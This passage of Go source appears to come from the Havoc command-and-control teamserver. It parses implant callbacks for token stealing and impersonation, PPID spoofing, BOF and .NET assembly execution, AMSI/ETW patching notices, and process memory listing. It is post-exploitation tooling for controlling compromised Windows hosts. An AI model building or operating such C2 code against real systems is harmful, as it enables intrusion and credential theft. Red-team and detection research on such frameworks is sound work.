					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - DEMON_COMMAND_PROC_CREATE, Invalid packet: %d", AgentID))
				}

				// TODO: can we expect more messages from this request?
				//a.RequestCompleted(RequestID)

				break

			case 5: // Proc:BlockDll
				// TODO: is this used?
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - 5", AgentID))
					var (
						BlockDll = int(Parser.ParseInt32())
						State    = "disabled"
					)

					if BlockDll == 1 {
						State = "enabled"
					}

					Message["Type"] = "Info"
					Message["Message"] = "Successfully " + State + " blockdll"
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - 5, Invalid packet", AgentID))
				}

				break

			case DEMON_COMMAND_PROC_MEMORY:
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - DEMON_COMMAND_PROC_MEMORY", AgentID))
					var (
						BaseAddress    string
						RegionSize     string
						AllocateProtec string
						// State 			string
						// Type			string

						iProtect int
						iState   int
						iType    int

						_ = Parser.ParseInt32()
						_ = Parser.ParseInt32()

						OutputBuffer bytes.Buffer
						tableData    [][]string
					)

					table := tablewriter.NewWriter(&OutputBuffer)

					table.SetHeader([]string{"Base Address", "Type", "Protection", "State", "Region Size"})
					table.SetBorder(false)
					table.SetHeaderAlignment(tablewriter.ALIGN_CENTER)
					table.SetColumnAlignment([]int{tablewriter.ALIGN_CENTER, tablewriter.ALIGN_CENTER, tablewriter.ALIGN_CENTER, tablewriter.ALIGN_CENTER, tablewriter.ALIGN_RIGHT})

					table.SetRowSeparator("-")
					table.SetColumnSeparator("│")
					table.SetCenterSeparator("+")

					for Parser.CanIRead([]parser.ReadType{parser.ReadPointer, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
						var (
							collum []string
						)

						BaseAddress = "0x" + strconv.FormatInt(Parser.ParsePointer(), 16)
						RegionSize = utils.ByteCountSI(int64(Parser.ParseInt32()))
						iProtect = int(Parser.ParseInt32())
						iState = int(Parser.ParseInt32())
						iType = int(Parser.ParseInt32())

						if Protection, ok := win32.Protections[iProtect]; !ok {
							AllocateProtec = "UNKNOWN"
						} else {
							AllocateProtec = Protection[0]
						}

						/*switch iProtect {

						  case win32.PAGE_NOACCESS:
						  	AllocateProtec = "PAGE_NOACCESS"
						  case win32.PAGE_READONLY:
						  	AllocateProtec = "PAGE_READONLY"
						  case win32.PAGE_READWRITE:
						  	AllocateProtec = "PAGE_READWRITE"
						  case win32.PAGE_WRITECOPY:
						  	AllocateProtec = "PAGE_WRITECOPY"
						  case win32.PAGE_EXECUTE:
						  	AllocateProtec = "PAGE_EXECUTE"
						  case win32.PAGE_EXECUTE_READ:
						  	AllocateProtec = "PAGE_EXECUTE_READ"
						  case win32.PAGE_EXECUTE_READWRITE:
						  	AllocateProtec = "PAGE_EXECUTE_READWRITE"
						  case win32.PAGE_EXECUTE_WRITECOPY:
						  	AllocateProtec = "PAGE_EXECUTE_WRITECOPY"
						  case win32.PAGE_GUARD:
						  	AllocateProtec = "PAGE_GUARD"
						  default:
						  	AllocateProtec = strconv.Itoa(iProtect)
						  }*/

						collum = []string{BaseAddress, strconv.Itoa(iType), AllocateProtec, strconv.Itoa(iState), RegionSize}
						tableData = append(tableData, collum)
					}

					table.AppendBulk(tableData)
					table.Render()

					if OutputBuffer.Len() > 0 {
						Message["Type"] = "Info"
						Message["Message"] = "List memory regions:"
						Message["Output"] = "\n" + OutputBuffer.String()
					} else {
						Message["Type"] = "Error"
						Message["Message"] = "Couldn't list memory regions"
					}
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - DEMON_COMMAND_PROC_MEMORY, Invalid packet", AgentID))
				}

				break

			case DEMON_COMMAND_PROC_KILL:
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
					var (
						Success   = Parser.ParseInt32()
						ProcessID = Parser.ParseInt32()
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - DEMON_COMMAND_PROC_KILL, Success: %d, ProcessID: %d", AgentID, Success, ProcessID))

					if Success == win32.TRUE {
						Message["Type"] = "Good"
						Message["Message"] = fmt.Sprintf("Successful killed process: %v", ProcessID)
					} else {
						Message["Type"] = "Error"
						Message["Message"] = "Failed to kill process"
					}
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - DEMON_COMMAND_PROC_KILL, Invalid packet", AgentID))
				}

			default:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - UNKNOWN (%d)", AgentID, SubCommand))
			}
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC, Invalid packet", AgentID))
		}

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

		break

	case COMMAND_INLINEEXECUTE:
		var (
			OutputMap = make(map[string]string)
			Type      = Parser.ParseInt32()
		)

		switch Type {
		case CALLBACK_OUTPUT:
			if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - CALLBACK_OUTPUT", AgentID))
				OutputMap["Output"] = Parser.ParseString()
				teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
			} else {
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - CALLBACK_OUTPUT, Invalid packet", AgentID))
			}

			break

		case CALLBACK_ERROR:
			if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - CALLBACK_ERROR", AgentID))
				OutputMap["Type"] = "Error"
				OutputMap["Output"] = Parser.ParseString()
				teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
			} else {
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - CALLBACK_ERROR, Invalid packet", AgentID))
			}

			break

		case COMMAND_INLINEEXECUTE_EXCEPTION:
			if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt64}) {
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - COMMAND_INLINEEXECUTE_EXCEPTION", AgentID))
				var (
					Exception = Parser.ParseInt32()
					Address   = Parser.ParseInt64()
				)

				OutputMap["Type"] = "Error"
				OutputMap["Message"] = fmt.Sprintf("Exception %v [%x] occurred while executing BOF at address %x", win32.StatusToString(int64(Exception)), Exception, Address)
				a.RequestCompleted(RequestID)
				teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
			} else {
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - COMMAND_INLINEEXECUTE_EXCEPTION, Invalid packet", AgentID))
			}

			break

		case COMMAND_INLINEEXECUTE_SYMBOL_NOT_FOUND:

			if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
				var LibAndFunc = Parser.ParseString()

				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - COMMAND_INLINEEXECUTE_SYMBOL_NOT_FOUND, LibAndFunc: %s", AgentID, LibAndFunc))

				OutputMap["Type"] = "Error"
				OutputMap["Message"] = "Symbol not found: " + LibAndFunc
				a.RequestCompleted(RequestID)
				teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
			} else {
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - COMMAND_INLINEEXECUTE_SYMBOL_NOT_FOUND, Invalid packet", AgentID))
			}

			break

		case COMMAND_INLINEEXECUTE_RAN_OK:

			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - COMMAND_INLINEEXECUTE_RAN_OK", AgentID))

			found := false
			for i, BofCallback := range a.BofCallbacks {
				if BofCallback.TaskID == RequestID {
					// send the output back to the python module
					OutputMap["Worked"] = "true"
					OutputMap["Output"] = BofCallback.Output
					OutputMap["Error"] = BofCallback.Error
					OutputMap["TaskID"] = strings.ToUpper(fmt.Sprintf("%08x", RequestID))
					teamserver.PythonModuleCallback(BofCallback.ClientID, a.NameID, HAVOC_BOF_CALLBACK, OutputMap)
					a.BofCallbacks = append(a.BofCallbacks[:i], a.BofCallbacks[i+1:]...)
					found = true
					break
				}
			}

			if found == false {
				OutputMap["Type"] = "Info"
				OutputMap["Message"] = "BOF execution completed"
				teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
			}

			a.RequestCompleted(RequestID)

			break

		case COMMAND_INLINEEXECUTE_COULD_NO_RUN:

			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - COMMAND_INLINEEXECUTE_COULD_NO_RUN", AgentID))

			found := false
			for i, BofCallback := range a.BofCallbacks {
				if BofCallback.TaskID == RequestID {
					// send the output back to the python module
					OutputMap["Worked"] = "false"
					OutputMap["Output"] = ""
					OutputMap["TaskID"] = strings.ToUpper(fmt.Sprintf("%08x", RequestID))
					teamserver.PythonModuleCallback(BofCallback.ClientID, a.NameID, HAVOC_BOF_CALLBACK, OutputMap)
					a.BofCallbacks = append(a.BofCallbacks[:i], a.BofCallbacks[i+1:]...)
					found = true
					break
				}
			}

			if found == false {
				OutputMap["Type"] = "Error"
				OutputMap["Message"] = "Failed to execute object file"
				teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
			}

			a.RequestCompleted(RequestID)

			break

		default:
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INLINEEXECUTE - UNKNOWN (%d)", AgentID, Type))
		}

	case COMMAND_ERROR:
		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			var (
				ErrorID = Parser.ParseInt32()
				Message = make(map[string]string)
			)

			switch ErrorID {
			case ERROR_WIN32_LASTERROR:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
					var (
						ErrorCode          = Parser.ParseInt32()
						ErrorString, found = Win32ErrorCodes[int(ErrorCode)]
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ERROR - ERROR_WIN32_LASTERROR, ErrorCode: %d", AgentID, ErrorCode))

					ErrorString += " "

					if !found {
						ErrorString = ""
					}

					Message["Type"] = "Error"
					Message["Message"] = fmt.Sprintf("Win32 Error: %v [%v]", ErrorString, ErrorCode)
					// TODO: can we expect more messages from this request?
					//a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ERROR - ERROR_WIN32_LASTERROR, Invalid packet", AgentID))
				}
				break

			case ERROR_TOKEN:
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
					var Status = Parser.ParseInt32()

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ERROR - ERROR_TOKEN, Status: %d", AgentID, Status))

					switch Status {
					case 0x1:
						Message["Type"] = "Error"
						Message["Message"] = "No tokens inside the token vault"
						break
					}
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ERROR - ERROR_TOKEN, Invalid packet", AgentID))
				}

			default:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ERROR - UNKNOWN (%d)", AgentID, ErrorID))
			}

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ERROR, Invalid packet", AgentID))
		}

	case COMMAND_ASSEMBLY_INLINE_EXECUTE:

		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			var (
				InfoID  = Parser.ParseInt32()
				Message = make(map[string]string)
			)

			switch InfoID {
			case DOTNET_INFO_PATCHED:

				Message["Type"] = "Info"
				Message["Message"] = "[HwBpEngine] Amsi/Etw has been hooked & patched"

				break

			case DOTNET_INFO_NET_VERSION:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE - DOTNET_INFO_NET_VERSION", AgentID))
					Message["Type"] = "Info"
					Message["Message"] = "Using CLR Version: " + Parser.ParseUTF16String()
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE - DOTNET_INFO_NET_VERSION, Invalid packet", AgentID))
				}

				break

			case DOTNET_INFO_ENTRYPOINT:
				var ThreadID int

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
					ThreadID = Parser.ParseInt32()

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE - DOTNET_INFO_ENTRYPOINT, ThreadID: %d", AgentID, ThreadID))

					Message = map[string]string{
						"Type":    "Good",
						"Message": fmt.Sprintf("Assembly has been executed [Thread: %d]", ThreadID),
					}
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE - DOTNET_INFO_ENTRYPOINT, Invalid packet", AgentID))
					Message = map[string]string{
						"Type":    "Error",
						"Message": fmt.Sprintf("Callback error: DOTNET_INFO_ENTRYPOINT (0x3) expects more or at least 4 bytes but received %d bytes.", Parser.Length()),
					}
				}

			case DOTNET_INFO_FINISHED:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE - DOTNET_INFO_FINISHED", AgentID))

				Message = map[string]string{
					"Type":    "Good",
					"Message": "Finished executing assembly.",
				}
				a.RequestCompleted(RequestID)
				break

			case DOTNET_INFO_FAILED:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE - DOTNET_INFO_FAILED", AgentID))

				Message = map[string]string{
					"Type":    "Error",
					"Message": "Failed to execute assembly or initialize the clr",
				}
				a.RequestCompleted(RequestID)
				break

			default:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE - UNKNOWN (%d)", AgentID, InfoID))
			}

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE, Invalid packet", AgentID))
		}

		break

	case COMMAND_ASSEMBLY_LIST_VERSIONS:
		logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_LIST_VERSIONS", AgentID))
		var Output string
		var Message = make(map[string]string)

		for Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
			Output += fmt.Sprintf("   - %v\n", Parser.ParseUTF16String())
		}

		Message["Type"] = typeInfo
		Message["Message"] = "List available assembly versions:"
		Message["Output"] = Output
		a.RequestCompleted(RequestID)
		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

		break

	case COMMAND_PROC_PPIDSPOOF:

		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			var (
				Ppid    = int(Parser.ParseInt32())
				Message = make(map[string]string)
			)

			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC_PPIDSPOOF, Ppid: %d", AgentID, Ppid))

			Message["Type"] = typeGood
			Message["Message"] = "Changed parent pid to spoof: " + strconv.Itoa(Ppid)

			a.RequestCompleted(RequestID)
			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC_PPIDSPOOF, Invalid packet", AgentID))
		}

		break

	case COMMAND_TOKEN:

		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			var (
				SubCommand = Parser.ParseInt32()
				Output     = make(map[string]string)
			)

			switch SubCommand {

			case DEMON_COMMAND_TOKEN_IMPERSONATE:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes}) {
					var (
						Successful = Parser.ParseInt32()
						User       = Parser.ParseBytes()
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_IMPERSONATE, Successful: %d, User: %s", AgentID, Successful, User))

					if Successful == win32.TRUE {
						Output["Type"] = typeGood
						Output["Message"] = fmt.Sprintf("Successful impersonated %s", User)
					} else {
						Output["Type"] = typeError
						Output["Message"] = fmt.Sprintf("Failed to impersonat %s", User)
					}
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_IMPERSONATE, Invalid packet", AgentID))
				}

				break

			case DEMON_COMMAND_TOKEN_STEAL:

				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32, parser.ReadInt32}) {
					var (
						User      = Parser.ParseUTF16String()
						TokenID   = Parser.ParseInt32()
						TargetPID = Parser.ParseInt32()
					)
					// TODO: this should have a fail case

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_STEAL, User: %s, TokenID: %v, TargetPID: %v", AgentID, User, TokenID, TargetPID))

					Output["Type"] = "Good"
					Output["Message"] = fmt.Sprintf("Successful stole and impersonated token from %v User:[%v] TokenID:[%v]", TargetPID, User, TokenID)
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_STEAL, Invalid packet", AgentID))
				}

				break

			case DEMON_COMMAND_TOKEN_LIST:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_LIST", AgentID))
				var (
					Buffer    string
					FmtString string
					Array     [][]any
					MaxString int
				)

				for Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
					var (
						TokenIndex    = Parser.ParseInt32()
						Handle        = fmt.Sprintf("0x%x", Parser.ParseInt32())
						DomainAndUser = Parser.ParseUTF16String()
						ProcessID     = Parser.ParseInt32()
						Type          = Parser.ParseInt32()
						Impersonating = Parser.ParseInt32()
					)

					Array = append(Array, []any{TokenIndex, Handle, DomainAndUser, ProcessID, Type, Impersonating})

					if len(DomainAndUser) > MaxString {
						MaxString = len(DomainAndUser)
					}
				}

				FmtString = fmt.Sprintf(" %%-4v  %%-6v  %%-%vv  %%-4v  %%-14v %%-4v\n", MaxString)

				if len(Array) > 0 {
					Buffer += fmt.Sprintf(FmtString, " ID ", "Handle", "Domain\\User", "PID", "Type", "Impersonating")
					Buffer += fmt.Sprintf(FmtString, "----", "------", "-----------", "---", "--------------", "-------------")

					for _, item := range Array {

						if item[4] == 0x1 {
							item[4] = "stolen"
						} else if item[4] == 0x2 {
							item[4] = "make (local)"
						} else if item[4] == 0x3 {
							item[4] = "make (network)"
						} else {
							item[4] = "unknown"
						}

						if item[5] == win32.TRUE {
							item[5] = "Yes"
						} else {
							item[5] = "No"
						}

						Buffer += fmt.Sprintf(FmtString, item[0], item[1], item[2], item[3], item[4], item[5])
					}
				} else {
					Buffer = "The token vault is empty"
				}

				Output["Type"] = "Info"
				Output["Message"] = "Token Vault:"
				Output["Output"] = "\n" + Buffer
				a.RequestCompleted(RequestID)

				break

			case DEMON_COMMAND_TOKEN_PRIVSGET_OR_LIST:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_PRIVSGET_OR_LIST", AgentID))

					var (
						PrivList     = Parser.ParseInt32()
						OutputBuffer bytes.Buffer
						TableData    [][]string
					)

					if PrivList == win32.TRUE {

						table := tablewriter.NewWriter(&OutputBuffer)

						table.SetBorder(false)
						table.SetHeaderAlignment(tablewriter.ALIGN_CENTER)

						table.SetRowSeparator(" ")
						table.SetColumnSeparator("::")
						table.SetCenterSeparator(" ")

						for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32}) {
							var (
								Column    []string
								Privilege string
								StateInt  int
								State     string
							)

							Privilege = Parser.ParseString()
							StateInt = Parser.ParseInt32()

							if StateInt == 3 {
								State = "Enabled"
							} else if StateInt == 2 {
								State = "Adjusted"
							} else if StateInt == 0 {
								State = "Disabled"
							} else {
								State = "Unknown"
							}

							Column = []string{Privilege, State}
							TableData = append(TableData, Column)
						}
						table.AppendBulk(TableData)
						table.Render()

						Output["Type"] = "Good"
						Output["Message"] = "List Privileges for current Token:"
						Output["Output"] = "\n" + OutputBuffer.String()
					} else {

						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes}) {
							var (
								Success  = Parser.ParseInt32()
								PrivName = Parser.ParseString()
							)

							if Success == 1 {
								Output["Type"] = "Good"
								Output["Message"] = fmt.Sprintf("The privilege %s was successfully enabled", PrivName)
							} else {
								Output["Type"] = "Error"
								Output["Message"] = fmt.Sprintf("Failed to enable the %s privilege", PrivName)
							}

						} else {
							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_PRIVSGET_OR_LIST, Invalid packet", AgentID))
						}
					}
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_PRIVSGET_OR_LIST, Invalid packet", AgentID))
				}

				break

			case DEMON_COMMAND_TOKEN_MAKE:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_MAKE", AgentID))
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					Output["Type"] = "Good"
					Output["Message"] = fmt.Sprintf("Successfully created and impersonated token: %s", Parser.ParseUTF16String())
				} else {
					Output["Type"] = "Error"
					Output["Message"] = fmt.Sprintf("Failed to create token")
				}
				a.RequestCompleted(RequestID)
				break

			case DEMON_COMMAND_TOKEN_GET_UID:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes}) {

					var (
						Elevated = Parser.ParseInt32()
						User     = Parser.ParseUTF16String()
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_GET_UID, Elevated: %d, User: %v", AgentID, Elevated, User))

					Output["Type"] = typeGood
					if Elevated == 0 {
						Output["Message"] = fmt.Sprintf("Token User: %v", User)
					} else {
						Output["Message"] = fmt.Sprintf("Token User: %v (Admin)", User)
					}
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_GET_UID, Invalid packet", AgentID))
				}

				break

			case DEMON_COMMAND_TOKEN_REVERT:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
					var Successful = Parser.ParseInt32()

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_REVERT, Successful: %d", AgentID, Successful))

					if Successful == win32.TRUE {
						Output["Type"] = typeGood
						Output["Message"] = "Successful reverted token to itself"
					} else {
						Output["Type"] = typeError
						Output["Message"] = "Failed to revert token to itself"
					}
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_REVERT, Invalid packet", AgentID))
				}

				break

			case DEMON_COMMAND_TOKEN_REMOVE:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
					var (
						Successful = Parser.ParseInt32()
						TokenID    = Parser.ParseInt32()
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_REMOVE, Successful: %d, TokenID: %v", AgentID, Successful, TokenID))

					if Successful == win32.TRUE {
						Output["Type"] = typeGood
						Output["Message"] = fmt.Sprintf("Successful removed token [%v] from vault", TokenID)
					} else {
						Output["Type"] = typeError
						Output["Message"] = fmt.Sprintf("Failed to remove token [%v] from vault", TokenID)
					}
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_REMOVE, Invalid packet", AgentID))
				}

				break

			case DEMON_COMMAND_TOKEN_FIND_TOKENS:

				var (
					Successful          int
					Buffer              string
					DomainAndUser       string
					NumTokens           int
					ProcessPID          int
					localHandle         int
					integrity_level     int
					integrity           string
					impersonation_level int
					impersonation       string
					TokenType           int
					Type                string
					Array               [][]any
					MaxString           int
					RemoteAuth          string
					FmtString           string
					FoundTokens         bool
				)

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {

					Successful = Parser.ParseInt32()

					MaxString = 0

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_FIND_TOKENS, Successful: %d", AgentID, Successful))

					if Successful == win32.TRUE {

						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {

							NumTokens = Parser.ParseInt32()
							FoundTokens = NumTokens > 0

							for NumTokens > 0 && Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
								DomainAndUser = Parser.ParseUTF16String()
								ProcessPID = Parser.ParseInt32()
								localHandle = Parser.ParseInt32()
								integrity_level = Parser.ParseInt32()
								impersonation_level = Parser.ParseInt32()
								TokenType = Parser.ParseInt32()

								if integrity_level <= SECURITY_MANDATORY_LOW_RID {
									integrity = "Low"
								} else if integrity_level >= SECURITY_MANDATORY_MEDIUM_RID && integrity_level < SECURITY_MANDATORY_HIGH_RID {
									integrity = "Medium"
								} else if integrity_level >= SECURITY_MANDATORY_HIGH_RID && integrity_level < SECURITY_MANDATORY_SYSTEM_RID {
									integrity = "High"
								} else if integrity_level >= SECURITY_MANDATORY_SYSTEM_RID {
									integrity = "System"
								}

								RemoteAuth = "No"
								if TokenType == TokenImpersonation {
									Type = "Impersonation"

									if impersonation_level == SecurityAnonymous {
										impersonation = "Anonymous"
									} else if impersonation_level == SecurityIdentification {
										impersonation = "Identification"
									} else if impersonation_level == SecurityImpersonation {
										impersonation = "Impersonation"
									} else if impersonation_level == SecurityDelegation {
										impersonation = "Delegation"
										RemoteAuth = "Yes"
									}
								} else if TokenType == TokenPrimary {
									Type = "Primary"
									impersonation = "N/A"
									RemoteAuth = "Yes"
								} else {
									Type = "?"
								}

								Array = append(Array, []any{DomainAndUser, integrity, Type, impersonation, "Yes", RemoteAuth, ProcessPID, fmt.Sprintf("%x", localHandle)})

								if len(DomainAndUser) > MaxString {
									MaxString = len(DomainAndUser)
								}

								NumTokens--
							}

							if FoundTokens == true {
								if MaxString < 13 {
									MaxString = 13
								}

								FmtString = fmt.Sprintf(" %%-%vv  %%-9v  %%-13v  %%-16v  %%-9v %%-10v %%-9v %%-9v\n", MaxString)

								Buffer += fmt.Sprintf(FmtString, " Domain\\User", "Integrity", "TokenType", "Impersonation LV", "LocalAuth", "RemoteAuth", "ProcessID", "Handle")
								Buffer += fmt.Sprintf(FmtString, strings.Repeat("-", MaxString), "---------", "-------------", "----------------", "---------", "----------", "---------", "------")

								for _, item := range Array {
									if item[7] == "0" {
										item[7] = ""
									}
									Buffer += fmt.Sprintf(FmtString, item[0], item[1], item[2], item[3], item[4], item[5], item[6], item[7])
								}

								Buffer += "\nTo impersonate a user, run: token steal [process id] (handle)"
							} else {
								Buffer += "No tokens found"
							}

							Output["Type"] = "Info"
							Output["Message"] = "Tokens available:"
							Output["Output"] = "\n" + Buffer
							a.RequestCompleted(RequestID)
						} else {
							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_FIND_TOKENS, Invalid packet: %d", AgentID))
						}
					} else {
						Output["Type"] = typeError
						Output["Message"] = "Failed to list existing tokens"
					}
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_FIND_TOKENS, Invalid packet", AgentID))
				}

				break

			case DEMON_COMMAND_TOKEN_CLEAR:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_CLEAR", AgentID))
				Output["Type"] = typeGood
				Output["Message"] = "Token vault has been cleared"
				a.RequestCompleted(RequestID)
				break

			default:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - UNKNOWN (%d)", AgentID, SubCommand))
			}

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN, Invalid packet", AgentID))
		}

		break

	case COMMAND_CONFIG:

		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			var (
				Message = make(map[string]string)

				Config     int
				ConfigData any
			)

			Config = Parser.ParseInt32()
			Message["Type"] = "Good"

			switch Config {

			case CONFIG_MEMORY_ALLOC:
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_MEMORY_ALLOC", AgentID))
